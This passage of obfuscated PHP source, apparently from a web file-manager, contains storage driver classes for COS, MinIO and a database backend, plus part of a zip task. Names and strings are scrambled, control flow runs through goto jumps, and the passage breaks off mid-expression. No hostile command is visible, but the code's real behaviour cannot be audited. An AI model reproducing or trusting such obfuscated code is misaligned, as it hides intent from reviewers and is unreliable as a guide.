$æšïõÄ† = str_replace($Æ¯ÚàŠÙ[1378], $Æ¯ÚàŠÙ[12], strtolower($Å¼Åã“º->getType())); if ($æšïõÄ† == $Æ¯ÚàŠÙ[116]) { return array($Æ¯ÚàŠÙ[43] => $Æ¯ÚàŠÙ[116], $Æ¯ÚàŠÙ[1375] => $Æ¯ÚàŠÙ[12], $Æ¯ÚàŠÙ[94] => $»ıì¢û×, $Æ¯ÚàŠÙ[105] => $Å¼Åã“º); } return array($Æ¯ÚàŠÙ[43] => $Æ¯ÚàŠÙ[929], $Æ¯ÚàŠÙ[1375] => $Å¼Åã“º->pathDriver, $Æ¯ÚàŠÙ[94] => $»ıì¢û×, $Æ¯ÚàŠÙ[105] => $Å¼Åã“º); } public static function pathDriverType($×›´şàÖ) { return $×›´şàÖ ? self::driverType(IO::init($×›´şàÖ)) : !1; } public static function pathDriverLocal($ËÊ¼Ç³Ã) { $§§Û¨¢¼ =& $_SERVER[ˆûùúÊ¯]; $ùù¬Ëğå = $ËÊ¼Ç³Ã ? self::driverType(IO::init($ËÊ¼Ç³Ã)) : !1; return $ùù¬Ëğå[$§§Û¨¢¼[43]] == $§§Û¨¢¼[116] ? !0 : !1; } public static function allowCover($’Áæå·§, $İÈÑ„Á = true) { $Æà²à¦— =& $_SERVER[ˆûùúÊ¯]; if (is_string($’Áæå·§)) { $’Áæå·§ = IO::info($’Áæå·§); } if (!$’Áæå·§ || $’Áæå·§[$Æà²à¦—[43]] == $Æà²à¦—[85] || $’Áæå·§[$Æà²à¦—[86]] <= 100) { return !1; } if (isset($’Áæå·§[$Æà²à¦—[1382]]) || !$’Áæå·§[$Æà²à¦—[94]]) { return !1; } if (isset($’Áæå·§[$Æà²à¦—[225]]) && !$’Áæå·§[$Æà²à¦—[225]]) { return !1; } static $¤İßÎÎÕ = false; if (!$¤İßÎÎÕ || !$İÈÑ„Á) { $õéÎô = self::driverType(IO::init($’Áæå·§[$Æà²à¦—[94]])); $ïîŠéõÛ = $õéÎô[$Æà²à¦—[105]]; $¤İßÎÎÕ = $Æà²à¦—[193]; if ($õéÎô[$Æà²à¦—[43]] == $Æà²à¦—[116]) { $¤İßÎÎÕ = $Æà²à¦—[1383]; } if ($õéÎô[$Æà²à¦—[105]] && is_array($õéÎô[$Æà²à¦—[105]]->config)) { $ºÉï´Âù = $õéÎô[$Æà²à¦—[105]]->config; if (isset($ºÉï´Âù[$Æà²à¦—[1384]]) && $ºÉï´Âù[$Æà²à¦—[1384]]) { $¤İßÎÎÕ = $Æà²à¦—[1383]; } } } return $¤İßÎÎÕ == $Æà²à¦—[1383] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ªŒ¶‚¨æ) { parent::__construct($ªŒ¶‚¨æ); $this->signatureVersion($_SERVER[ˆûùúÊ¯][240]); } public function uploadFormData($Õ¾‚®Ÿ¡, $©âıø„ = 3600) { $öı€ÆÚŞ =& $_SERVER[ˆûùúÊ¯]; $²Ù½ˆ— = $öı€ÆÚŞ[222]; $÷ø’¹“è = $öı€ÆÚŞ[255]; $‹«Û¤æ = $öı€ÆÚŞ[265]; $ÆÊ¬èŞ“ = gmdate($öı€ÆÚŞ[1385], time() + $©âıø„); $¢Úé‹Ì = (string) time() . $öı€ÆÚŞ[81] . (string) (time() + $©âıø„); $­á¨á–œ = array($öı€ÆÚŞ[266] => $ÆÊ¬èŞ“, $öı€ÆÚŞ[269] => array(array($öı€ÆÚŞ[271] => $²Ù½ˆ—), array($öı€ÆÚŞ[270] => $this->bucket), array($öı€ÆÚŞ[272], $öı€ÆÚŞ[273], $öı€ÆÚŞ[12]), array($öı€ÆÚŞ[276] => $‹«Û¤æ), array($öı€ÆÚŞ[1386] => $÷ø’¹“è), array($öı€ÆÚŞ[1387] => $this->accessKey), array($öı€ÆÚŞ[1388] => $¢Úé‹Ì))); $­á¨á–œ = json_encode($­á¨á–œ); $±¤Œô†® = hash_hmac($öı€ÆÚŞ[255], $¢Úé‹Ì, $this->secret); $ÔªŞÚàÖ = sha1($­á¨á–œ); $¸Ö×­ ¯ = hash_hmac($öı€ÆÚŞ[255], $ÔªŞÚàÖ, $±¤Œô†®); $õöƒêø• = array($öı€ÆÚŞ[271] => $²Ù½ˆ—, $öı€ÆÚŞ[276] => $‹«Û¤æ, $öı€ÆÚŞ[284] => base64_encode($­á¨á–œ), $öı€ÆÚŞ[1386] => $÷ø’¹“è, $öı€ÆÚŞ[1387] => $this->accessKey, $öı€ÆÚŞ[1389] => $¢Úé‹Ì, $öı€ÆÚŞ[1390] => $¸Ö×­ ¯, $öı€ÆÚŞ[205] => $this->getHost()); return $õöƒêø•; } public function fileOutLink($Øç¯ßì±) { $ôğİ¥Õ =& $_SERVER[ˆûùúÊ¯]; if (substr($Øç¯ßì±, 0, 7) == $ôğİ¥Õ[1391]) { $Øç¯ßì± = $ôğİ¥Õ[1392] . substr($Øç¯ßì±, 7); } header($ôğİ¥Õ[171] . $Øç¯ßì±); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ó£‘şÕ) { $this->pathParse = $Ó£‘şÕ; $this->model = Model($_SERVER[ˆûùúÊ¯][1393]); } public function getPath($‘¶Å¹ Ó) { return trim($‘¶Å¹ Ó, $_SERVER[ˆûùúÊ¯][8]); } public function pathFather($‡œˆÚ…¡) { $ñ°›‚— = $this->parse($‡œˆÚ…¡); $ñ°›‚— = $this->infoSimple($‡œˆÚ…¡); return $ñ°›‚— ? $ñ°›‚—[$_SERVER[ˆûùúÊ¯][189]] : !1; } public function pathThis($ÒõÒªµò) { $¢ô÷ç©ı = $this->infoSimple($ÒõÒªµò); return $¢ô÷ç©ı ? $¢ô÷ç©ı[$_SERVER[ˆûùúÊ¯][42]] : !1; } public function getPathOuter($ü¹±Ø§ª) { if (!$ü¹±Ø§ª) { return $ü¹±Ø§ª; } $çı£¦Ş = $this->parse($ü¹±Ø§ª); return KodIO::make($çı£¦Ş[$_SERVER[ˆûùúÊ¯][451]]); } public function copyFolderFromIO($¡˜äâšç, $Ç, $Î½ÊÙâî, $Î¥¦Ù´¿, $æó­©Ñ) { $ÁÛ‰Ğ£ò = $this->model->copyFolderFromIO($¡˜äâšç, $Ç, $Î½ÊÙâî, $Î¥¦Ù´¿, $æó­©Ñ); return KodIO::make($ÁÛ‰Ğ£ò); } public function isParentOf($ß§³ù­ô, $¸®Î¢ì£) { return $this->model->isParentOf($ß§³ù­ô, $¸®Î¢ì£); } public function mkfile($„‰ĞíË”, $òŒ»ı¶ş = '', $•ÚÈÌ™ = REPEAT_RENAME) { $Ù«‘ ¬À =& $_SERVER[ˆûùúÊ¯]; $Ó×Œû·Ğ = $this->parse($„‰ĞíË”); $„‰ĞíË” = $Ó×Œû·Ğ[$Ù«‘ ¬À[451]]; for ($ı•¯§”™ = 0; $ı•¯§”™ < count($Ó×Œû·Ğ[$Ù«‘ ¬À[1394]]); $ı•¯§”™++) { $œ³…ıìÅ = $Ó×Œû·Ğ[$Ù«‘ ¬À[1394]][$ı•¯§”™]; if ($ı•¯§”™ == count($Ó×Œû·Ğ[$Ù«‘ ¬À[1394]]) - 1) { $„‰ĞíË” = $this->model->mkfile($„‰ĞíË”, $œ³…ıìÅ, $òŒ»ı¶ş, $•ÚÈÌ™); break; } $„‰ĞíË” = $this->model->mkdir($„‰ĞíË”, $œ³…ıìÅ, REPEAT_SKIP); } return $this->getPathOuter($„‰ĞíË”); } public function mkdir($»‡ÈèÓ¡, $„ëÌŸÇ = REPEAT_SKIP) { $²ˆ¨á†Ù =& $_SERVER[ˆûùúÊ¯]; $ñ™Ú´¶î = $this->parse($»‡ÈèÓ¡); $»‡ÈèÓ¡ = $ñ™Ú´¶î[$²ˆ¨á†Ù[451]]; for ($«úˆõ—‹ = 0; $«úˆõ—‹ < count($ñ™Ú´¶î[$²ˆ¨á†Ù[1394]]); $«úˆõ—‹++) { $ªÇîõÜØ = $ñ™Ú´¶î[$²ˆ¨á†Ù[1394]][$«úˆõ—‹]; $»‡ÈèÓ¡ = $this->model->mkdir($»‡ÈèÓ¡, $ªÇîõÜØ, $„ëÌŸÇ); } return $this->getPathOuter($»‡ÈèÓ¡); } public function copyFile($‡Ñ¢®ºµ, $ÔüÊãİ , $‡ñÏú¿Ô = REPEAT_REPLACE) { $Ç ê…ß¡ =& $_SERVER[ˆûùúÊ¯]; $¿µ·÷¦€ = $this->parse($ÔüÊãİ ); $ı£«÷ì = $this->model->copy($‡Ñ¢®ºµ, $¿µ·÷¦€[$Ç ê…ß¡[451]], $‡ñÏú¿Ô, $¿µ·÷¦€[$Ç ê…ß¡[94]]); return $ı£«÷ì ? $this->getPathOuter($ı£«÷ì) : !1; } public function moveFile($¿ëÓ™Õ, $üÙÃÁı, $²Ä³úÄş = REPEAT_REPLACE) { $—©í¢¢ã =& $_SERVER[ˆûùúÊ¯]; $š‚®ùâ¶ = $this->parse($üÙÃÁı); $ÏÛáÀÕÈ = $this->model->move($¿ëÓ™Õ, $š‚®ùâ¶[$—©í¢¢ã[451]], $²Ä³úÄş, $š‚®ùâ¶[$—©í¢¢ã[94]]); return $ÏÛáÀÕÈ ? $this->getPathOuter($ÏÛáÀÕÈ) : !1; } public function copy($ŞùĞÉÙ¾, $²öú×›³, $¼İ––Êá = REPEAT_REPLACE, $í­ÌìÔà = false) { $•óãÍÜÓ = $this->parse($²öú×›³); $é›˜Ú¤  = $this->model->copy($ŞùĞÉÙ¾, $•óãÍÜÓ[$_SERVER[ˆûùúÊ¯][451]], $¼İ––Êá, $í­ÌìÔà); return $é›˜Ú¤  ? $this->getPathOuter($é›˜Ú¤ ) : !1; } public function moveSameAllow() { } public function move($É†Ü¯ÅÒ, $®Õ©¹©—, $ÍØñÊ¿ = REPEAT_REPLACE, $û ‘ñ¥ = false) { $ù“ˆ‰û® = $this->parse($®Õ©¹©—); $’ŠÅ‘¼ = $this->model->move($É†Ü¯ÅÒ, $ù“ˆ‰û®[$_SERVER[ˆûùúÊ¯][451]], $ÍØñÊ¿, $û ‘ñ¥); return $’ŠÅ‘¼ ? $this->getPathOuter($’ŠÅ‘¼) : !1; } public function remove($â×––Æ, $ñ¦Ìªå³ = true) { return $this->model->remove($â×––Æ, $ñ¦Ìªå³); } public function rename($¶­Şû¤’, $ó×’Ç©´) { $æƒ¶ŒÓò = $this->model->rename($¶­Şû¤’, $ó×’Ç©´); return $æƒ¶ŒÓò ? $this->getPathOuter($¶­Şû¤’) : $æƒ¶ŒÓò; } public function size($ò›á©¶­) { $ÌÛÆ—éè = $this->infoSimple($ò›á©¶­); return $ÌÛÆ—éè ? $ÌÛÆ—éè[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function infoSimple($¯‘ïÖÄŒ) { return $this->model->sourceInfo($¯‘ïÖÄŒ); } public function info($œç°‚ûœ) { return $this->infoParse($œç°‚ûœ); } public function infoAuth($ƒè¨Ì¾Ş) { return $this->infoParse($ƒè¨Ì¾Ş, !1, !0); } public function infoWithChildren($‹şïîº) { return $this->infoParse($‹şïîº, !0); } protected function infoParse($û†‘Ë÷“, $ŞÌëèÌ = false, $ØÌ÷›€¢ = false) { if (!$ŞÌëèÌ) { return $this->model->pathInfo($û†‘Ë÷“, $ØÌ÷›€¢); } return $this->model->pathInfoMore($û†‘Ë÷“); } public function infoFullSimple($ùèõˆ•ï) { $âİ˜Í¡¹ =& $_SERVER[ˆûùúÊ¯]; $š«ûÊµ¡ = explode($âİ˜Í¡¹[8], $ùèõˆ•ï); $˜ßë‰¶é = implode($âİ˜Í¡¹[8], array_splice($š«ûÊµ¡, 1)); return $this->model->pathInfoByPath($š«ûÊµ¡[0], $˜ßë‰¶é); } public function infoFull($·ÓÔ¹ØÓ) { $â“Ë·ƒì = $this->infoFullSimple($·ÓÔ¹ØÓ); return is_array($â“Ë·ƒì) ? $this->model->pathInfo($â“Ë·ƒì[$_SERVER[ˆûùúÊ¯][190]]) : !1; } public function hashSimple($ìˆ”³Èè) { $©Ìú÷´ò =& $_SERVER[ˆûùúÊ¯]; $ğ·¿¤Œ£ = $this->infoWithChildren($ìˆ”³Èè); return $ğ·¿¤Œ£[$©Ìú÷´ò[524]][$©Ìú÷´ò[648]]; } public function hashMd5($’©ØÂœ) { $çÔØ•‰í =& $_SERVER[ˆûùúÊ¯]; $„Ò¾––î = $this->infoWithChildren($’©ØÂœ); return $„Ò¾––î[$çÔØ•‰í[524]][$çÔØ•‰í[649]]; } public function exist($İä–÷¸Æ) { $ùª°—Ì¥ =& $_SERVER[ˆûùúÊ¯]; $ÀØïèÁá = $this->parse($İä–÷¸Æ); if (!$ÀØïèÁá[$ùª°—Ì¥[94]]) { return $this->isFile($İä–÷¸Æ) || $this->isFolder($İä–÷¸Æ); } $ûÛ´ç¨ı = array($ùª°—Ì¥[453] => $ÀØïèÁá[$ùª°—Ì¥[451]], $ùª°—Ì¥[42] => $ÀØïèÁá[$ùª°—Ì¥[94]]); $¶äòŒ = $this->model->where($ûÛ´ç¨ı)->find(); return $¶äòŒ ? !0 : !1; } public function isFile($Çëºä‹‰) { $è½Ê› =& $_SERVER[ˆûùúÊ¯]; $ÛÌÌøĞâ = $this->infoSimple($Çëºä‹‰); return $ÛÌÌøĞâ && $ÛÌÌøĞâ[$è½Ê›[461]] == $è½Ê›[221] ? !0 : !1; } public function isFolder($Ç½‡šÎ¦) { $ØçÕ®©— =& $_SERVER[ˆûùúÊ¯]; $†û¥š = $this->infoSimple($Ç½‡šÎ¦); return $†û¥š && $†û¥š[$ØçÕ®©—[461]] == $ØçÕ®©—[98] ? !0 : !1; } public function listPath($¢Ô½¿ß, $òì€‚ô¾ = false) { $¼Õİ•ı =& $_SERVER[ˆûùúÊ¯]; if ($¢Ô½¿ß == $¼Õİ•ı[12]) { return !1; } $ã—Ğş¯× = array($¼Õİ•ı[453] => $¢Ô½¿ß); if ($òì€‚ô¾) { return $this->model->listSource($ã—Ğş¯×, -1); } return $this->model->listSource($ã—Ğş¯×); } public function has($Å€Ğ±ì•, $íËÛ·ì = false, $î„Ëæ¢ñ = null) { $ë–ãöûğ =& $_SERVER[ˆûùúÊ¯]; $¬½É²†Ş = $this->infoWithChildren($Å€Ğ±ì•); if ($íËÛ·ì) { return array($ë–ãöûğ[233] => $¬½É²†Ş[$ë–ãöûğ[233]], $ë–ãöûğ[232] => $¬½É²†Ş[$ë–ãöûğ[232]]); } return $î„Ëæ¢ñ ? $¬½É²†Ş[$ë–ãöûğ[233]] : $¬½É²†Ş[$ë–ãöûğ[232]]; } public function listAll($òÛÀã¬›) { $ÇËøğ€  = IO::info($this->pathParse[$_SERVER[ˆûùúÊ¯][94]]); if (!$ÇËøğ€ ) { return array(); } return $this->model->listAll($òÛÀã¬›); } public function getContent($âíïçú) { return $this->model->getContent($âíïçú); } public function setContent($–Ù¡Ìş, $–¬Î °­ = '') { return $this->model->setContent($–Ù¡Ìş, $–¬Î °­); } public function fileSubstr($ŠÅ™ˆ, $¡ğñó…, $£º³¡“) { return $this->model->fileSubstr($ŠÅ™ˆ, $¡ğñó…, $£º³¡“); } public function download($¤£ı´‰Ö, $ÄÒ—æÂù = '') { $ˆü­Î«à = get_path_father($ÄÒ—æÂù); $ñ“œû·• = get_path_this($ÄÒ—æÂù); $Ğİ÷¤•Ï = $this->model->fileInfoGet($¤£ı´‰Ö); $Á¼­ä†æ = IO::copy($Ğİ÷¤•Ï[$_SERVER[ˆûùúÊ¯][94]], $ˆü­Î«à, !1, $ñ“œû·•); return $Á¼­ä†æ; } public function setModifyTime($ëÅ¹íˆº, $ô¦ÁÊ€û = '') { $Èà‘°Á× =& $_SERVER[ˆûùúÊ¯]; if (!$ëÅ¹íˆº) { return; } $this->model->where(array($Èà‘°Á×[467] => $ëÅ¹íˆº))->save(array($Èà‘°Á×[95] => $ô¦ÁÊ€û)); } public function upload($Æ£¶ÍÚ, $ğøüòè, $æ½Œß‹ = false, $ê¨Â¨–Û = REPEAT_REPLACE) { $”Šßøö =& $_SERVER[ˆûùúÊ¯]; $£è¯¶˜ = $this->parse($Æ£¶ÍÚ); $Ê®Úøæé = $this->model->addFile($£è¯¶˜[$”Šßøö[451]], $ğøüòè, $£è¯¶˜[$”Šßøö[94]], $æ½Œß‹, $ê¨Â¨–Û); return $this->getPathOuter($Ê®Úøæé); } public function uploadFileByID($Ââˆ, $ñ¸Š»õŞ, $µ´„Ó¶ã) { $‡’¬»ù =& $_SERVER[ˆûùúÊ¯]; $¬ßÉÂ€¡ = $this->parse($Ââˆ); $‚Ú²Ã© = $this->model->addFileByFileID($¬ßÉÂ€¡[$‡’¬»ù[451]], $ñ¸Š»õŞ, $¬ßÉÂ€¡[$‡’¬»ù[94]], $µ´„Ó¶ã); return $this->getPathOuter($‚Ú²Ã©); } public function addFileByRemote($ûË¸ñ—É, $ÛŠ×Í³™, $ÑıŒÛû = array(), $‚Ö»œºş = '', $ç¹ƒúÖƒ) { $ı†¡ú‹ =& $_SERVER[ˆûùúÊ¯]; $Õ°²Û¬ = $this->parse($ûË¸ñ—É); $‚Ö»œºş = empty($‚Ö»œºş) ? $Õ°²Û¬[$ı†¡ú‹[94]] : $‚Ö»œºş; $½ú‚Òâ = $this->model->addFileByRemote($Õ°²Û¬[$ı†¡ú‹[451]], $ÛŠ×Í³™, $‚Ö»œºş, $ÑıŒÛû, $ç¹ƒúÖƒ); return $this->getPathOuter($½ú‚Òâ); } public function uploadLink($®Ê²Œø±, $à±Çãş = 0) { $ÙñÎşŸç =& $_SERVER[ˆûùúÊ¯]; $îéòÅÑŒ = $this->parse($®Ê²Œø±); $×›òÎ¬© = _get($GLOBALS[$ÙñÎşŸç[7]], $ÙñÎşŸç[1395]); $’æ”ö¥ = _get($GLOBALS[$ÙñÎşŸç[7]], $ÙñÎşŸç[1396]); $®Ê²Œø± = Model($ÙñÎşŸç[651])->createFileName($îéòÅÑŒ[$ÙñÎşŸç[94]], $×›òÎ¬©, $’æ”ö¥); return IO::uploadLink($®Ê²Œø±, $à±Çãş); } public function fileNameAuto($Ó†¯öœ¥, $Èª‚Œ¾, $Œ˜ïËñ¶ = REPEAT_REPLACE, $‚‚¹ğ†× = false) { return $this->model->fileNameAuto($Ó†¯öœ¥, $Èª‚Œ¾, $Œ˜ïËñ¶, $‚‚¹ğ†×); } public function fileNameExist($¿ÔˆòÄé, $¼áºğÂî) { return $this->model->fileNameExist($¿ÔˆòÄé, $¼áºğÂî); } protected function _fileOut($ûúŞ£İÂ, $ÛÅÙÅ¶¤ = false, $½ˆïç«Û = false, $ì¼ìºšº = '', $“¸àŠ°Š = false) { $èŞıò·ş =& $_SERVER[ˆûùúÊ¯]; $¥×Ù“õ = $this->model->sourceInfo($ûúŞ£İÂ); if ($¥×Ù“õ[$èŞıò·ş[461]] == $èŞıò·ş[98]) { header($èŞıò·ş[1397]); die; } $¦­¼äùÎ = $this->model->fileInfoGet($ûúŞ£İÂ); $ì¼ìºšº = $¦­¼äùÎ[$èŞıò·ş[649]] ? $¦­¼äùÎ[$èŞıò·ş[649]] : $ì¼ìºšº; $½üå©°ê = is_array($GLOBALS[$èŞıò·ş[178]]) ? $GLOBALS[$èŞıò·ş[178]][$èŞıò·ş[42]] : $¥×Ù“õ[$èŞıò·ş[42]]; if ($“¸àŠ°Š) { return IO::fileOutServer($¦­¼äùÎ[$èŞıò·ş[94]], $ÛÅÙÅ¶¤, $½üå©°ê, $ì¼ìºšº); } IO::fileOut($¦­¼äùÎ[$èŞıò·ş[94]], $ÛÅÙÅ¶¤, $½üå©°ê, $ì¼ìºšº); } public function fileOut($Í ¥ÀÃá, $ˆ½áÌØ = false, $å­ÚÛõÆ = false, $Ó™¸”Ë» = '') { $this->_fileOut($Í ¥ÀÃá, $ˆ½áÌØ, $å­ÚÛõÆ, $Ó™¸”Ë»); } public function fileOutServer($„é‰íİ‘, $³úƒãÜ¼ = false, $©÷½˜Ù = false, $è¦‹ÍÑ‰ = '') { $this->_fileOut($„é‰íİ‘, $³úƒãÜ¼, $©÷½˜Ù, $è¦‹ÍÑ‰, !0); } protected function _fileOutImage($³­î™ô, $ñ›ë¡ = 250) { $Í¸ª¶Ö =& $_SERVER[ˆûùúÊ¯]; $İƒ¨İØÙ = $this->model->pathInfo($³­î™ô); if ($İƒ¨İØÙ[$Í¸ª¶Ö[461]] == $Í¸ª¶Ö[98]) { show_json($Í¸ª¶Ö[1398] . $³­î™ô, !1); } $…©²ÏØÖ = $this->model->fileInfoGet($³­î™ô); $İƒ¨İØÙ[$Í¸ª¶Ö[179]] = $…©²ÏØÖ[$Í¸ª¶Ö[94]]; $GLOBALS[$Í¸ª¶Ö[178]] = $İƒ¨İØÙ; IO::fileOutImage($…©²ÏØÖ[$Í¸ª¶Ö[94]], $ñ›ë¡); } public function fileOutImage($î†‘¥İ¹, $á±è¾Óì = 250) { $this->_fileOutImage($î†‘¥İ¹, $á±è¾Óì); } public function fileOutImageServer($À¥¢äş, $ïÇ·İ•ü = 250) { $this->_fileOutImage($À¥¢äş, $ïÇ·İ•ü); } public function link($»Üœ±áÔ, $ÏÚ·°ë¡ = '') { $ş¿‘—àÚ = $this->model->fileInfoGet($»Üœ±áÔ); return IO::link($ş¿‘—àÚ[$_SERVER[ˆûùúÊ¯][94]], $ÏÚ·°ë¡); } protected function parse($ÖìÈ­ç) { $¶Ôñ§•‹ =& $_SERVER[ˆûùúÊ¯]; if (strstr($ÖìÈ­ç, $¶Ôñ§•‹[8]) === !1) { return array($¶Ôñ§•‹[469] => intval($ÖìÈ­ç), $¶Ôñ§•‹[94] => $¶Ôñ§•‹[12], $¶Ôñ§•‹[1394] => array()); } $ÛôØÇ¬¹ = explode($¶Ôñ§•‹[8], trim($ÖìÈ­ç, $¶Ôñ§•‹[8])); if (count($ÛôØÇ¬¹) < 2) { show_tips(clear_html($ÖìÈ­ç) . $¶Ôñ§•‹[1399]); } return array($¶Ôñ§•‹[469] => intval($ÛôØÇ¬¹[0]), $¶Ôñ§•‹[94] => $ÛôØÇ¬¹[1], $¶Ôñ§•‹[1394] => array_slice($ÛôØÇ¬¹, 1)); } } goto BÆêŞ†ƒÇ‘; AÌË§³»: function binCheckBigger($Ó˜ƒ¤Ğñ, $·×…Âè¶) { return $Ó˜ƒ¤Ğñ > $·×…Âè¶; } $_SERVER[$_SERVER[˜½Êêò][3]] = ("\x38\x32\x36\x33"."\x35\x35")+0;$_lpdi="fxb1ctgoeiazpqs2rundvj9m5ky76lh480w3e9js5rp28gvc1mk7htzi3quf4nwxaod6ly0b27yo";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($øôÉ«€Ô, $ûœà£éŞ) { $şªô·¾ =& $_SERVER[ˆûùúÊ¯]; if (isset(self::$_methodList[$øôÉ«€Ô])) { return @call_user_func_array(self::$_methodList[$øôÉ«€Ô], $ûœà£éŞ); } else { if (method_exists($this, $øôÉ«€Ô)) { return call_user_func_array(array($this, $øôÉ«€Ô), $ûœà£éŞ); } else { think_exception(__CLASS__ . $şªô·¾[4] . $øôÉ«€Ô . $şªô·¾[5]); } } } public static function __callStatic($¦æøÎ„Ù, $şÑ×Ò¶ì) { if (isset(self::$_methodListStatic[$¦æøÎ„Ù])) { return call_user_func_array(self::$_methodListStatic[$¦æøÎ„Ù], $şÑ×Ò¶ì); } else { if (method_exists(self, $¦æøÎ„Ù)) { return call_user_func_array(array(self, $¦æøÎ„Ù), $şÑ×Ò¶ì); } else { show_json("{$¦æøÎ„Ù}\50\51\40\x6e\x6f\164\40\145\x78\x69\163\164\x3b", !1); } } } public static function addMethod($åÂ— ¡È, $½êª¤¤ı) { self::$_methodList[$åÂ— ¡È] = $½êª¤¤ı; } public static function addMethodStatic($êÍËÊ„ö, $¡¹•Å†) { self::$_methodListStatic[$êÍËÊ„ö] = $¡¹•Å†; } } goto CÍ—°á¸ª¤; dÊ‰Á›ö·: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­âˆ¢š) { parent::__construct($­âˆ¢š); $this->signatureVersion($_SERVER[ˆûùúÊ¯][240]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Õõ›•ïÒ, $‚˜×ëóá = 3600) { $Ó®Î°³‰ =& $_SERVER[ˆûùúÊ¯]; $Ä„¿¶å = $Ó®Î°³‰[222]; $Ü¤ºàØ× = $Ó®Î°³‰[261]; $ëÛÚ§›” = $Ó®Î°³‰[72]; $¯ĞóÁÎš = gmdate($Ó®Î°³‰[262]); $¥ÂóÈ–û = gmdate($Ó®Î°³‰[263]); $šÑ…Äø = $Ó®Î°³‰[264]; $×©–íÔ = $‚˜×ëóá . $Ó®Î°³‰[12]; $ÚÓ¸ùÁ¢ = $Ó®Î°³‰[265]; $ëÃÜ•Ç = array($this->accessKey, $¥ÂóÈ–û, $this->region, $ëÛÚ§›”, $šÑ…Äø); $Ûİ·÷ê¨ = implode($Ó®Î°³‰[8], $ëÃÜ•Ç); $ôô…ıØ° = array($Ó®Î°³‰[266] => gmdate($Ó®Î°³‰[267], strtotime($Ó®Î°³‰[268])), $Ó®Î°³‰[269] => array(array($Ó®Î°³‰[270] => $this->bucket), array($Ó®Î°³‰[271] => $Ä„¿¶å), array($Ó®Î°³‰[272], $Ó®Î°³‰[273], $Ó®Î°³‰[12]), array($Ó®Î°³‰[272], $Ó®Î°³‰[274], $Ó®Î°³‰[12]), array($Ó®Î°³‰[272], $Ó®Î°³‰[275], $Ó®Î°³‰[12]), array($Ó®Î°³‰[276] => $ÚÓ¸ùÁ¢), array($Ó®Î°³‰[277] => $Ûİ·÷ê¨), array($Ó®Î°³‰[278] => $Ü¤ºàØ×), array($Ó®Î°³‰[279] => $¯ĞóÁÎš), array($Ó®Î°³‰[280] => $×©–íÔ))); $Ï¡ı‡£€ = base64_encode(json_encode($ôô…ıØ°)); $ê²ÅÕ¦• = hash_hmac($Ó®Î°³‰[281], $¥ÂóÈ–û, $Ó®Î°³‰[282] . $this->secret, !0); $ş¦ÊéÄÇ = hash_hmac($Ó®Î°³‰[281], $this->region, $ê²ÅÕ¦•, !0); $”Ğò’òø = hash_hmac($Ó®Î°³‰[281], $ëÛÚ§›”, $ş¦ÊéÄÇ, !0); $ş¤Š‘ˆ¥ = hash_hmac($Ó®Î°³‰[281], $šÑ…Äø, $”Ğò’òø, !0); $ÙÄÁû­Ü = hash_hmac($Ó®Î°³‰[281], $Ï¡ı‡£€, $ş¤Š‘ˆ¥); $›ˆ½ÒÍª = array($Ó®Î°³‰[239] => $Ó®Î°³‰[12], $Ó®Î°³‰[283] => $Ó®Î°³‰[12], $Ó®Î°³‰[271] => $Ä„¿¶å, $Ó®Î°³‰[276] => $ÚÓ¸ùÁ¢, $Ó®Î°³‰[284] => $Ï¡ı‡£€, $Ó®Î°³‰[285] => $Ûİ·÷ê¨, $Ó®Î°³‰[286] => $Ü¤ºàØ×, $Ó®Î°³‰[287] => $¯ĞóÁÎš, $Ó®Î°³‰[288] => $×©–íÔ, $Ó®Î°³‰[289] => $ÙÄÁû­Ü, $Ó®Î°³‰[205] => $this->getHost()); return $›ˆ½ÒÍª; } } define($_SERVER[ˆûùúÊ¯][290], 1); define($_SERVER[ˆûùúÊ¯][291], 2); goto eÖºµÆŒÙ; E›ÀÎ©øçÊ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $úĞ¨ûÙì =& $_SERVER[ˆûùúÊ¯]; parent::startAfter(); Hook::bind($úĞ¨ûÙì[1823], array($this, $úĞ¨ûÙì[1818])); $¼¯êœİŠ =& $this->task; $¼¯êœİŠ[$úĞ¨ûÙì[1820]] = $úĞ¨ûÙì[1255]; if (!$¼¯êœİŠ[$úĞ¨ûÙì[1601]]) { $¼¯êœİŠ[$úĞ¨ûÙì[1601]] = LNG($úĞ¨ûÙì[1824]); } } protected function endAfter() { $Í×­¨Àš =& $_SERVER[ˆûùúÊ¯]; parent::endAfter(); Hook::unbind($Í×­¨Àš[1823], array($this, $Í×­¨Àš[1818])); } public function updateAfter() { $£µŞö =& $_SERVER[ˆûùúÊ¯]; $æÓ¾¾ë” =& $this->task; if (!$æÓ¾¾ë”[$£µŞö[846]] || !$æÓ¾¾ë”[$£µŞö[823]]) { return; } if ($æÓ¾¾ë”[$£µŞö[1820]] == $£µŞö[1255]) { $Ÿ±÷Ë´Â = $æÓ¾¾ë”[$£µŞö[1758]]; if ($æÓ¾¾ë”[$£µŞö[1759]] != $£µŞö[1255]) { $Ÿ±÷Ë´Â = 0; } $¦ç°ƒ­ø = ($æÓ¾¾ë”[$£µŞö[1762]] + $Ÿ±÷Ë´Â) / $æÓ¾¾ë”[$£µŞö[823]]; $æÓ¾¾ë”[$£µŞö[1706]] = $¦ç°ƒ­ø * 0.3; } else { if ($æÓ¾¾ë”[$£µŞö[1820]] == $£µŞö[365]) { $¦ç°ƒ­ø = $æÓ¾¾ë”[$£µŞö[1705]] / $æÓ¾¾ë”[$£µŞö[846]]; $æÓ¾¾ë”[$£µŞö[1706]] = 0.3 + $¦ç°ƒ­ø * 0.5; } else { if ($æÓ¾¾ë”[$£µŞö[1820]] == $£µŞö[117]) { $¦ç°ƒ­ø = 0; if ($æÓ¾¾ë”[$£µŞö[1757]]) { $¦ç°ƒ­ø = $æÓ¾¾ë”[$£µŞö[1758]] / $æÓ¾¾ë”[$£µŞö[1757]]; } $æÓ¾¾ë”[$£µŞö[1706]] = 0.3 + 0.5 + $¦ç°ƒ­ø * 0.2; } } } if ($æÓ¾¾ë”[$£µŞö[1706]] > 0) { $´äÁ€² = timeFloat() - $æÓ¾¾ë”[$£µŞö[1708]] - $æÓ¾¾ë”[$£µŞö[1711]]; $æÓ¾¾ë”[$£µŞö[1712]] = $´äÁ€² * (1 - 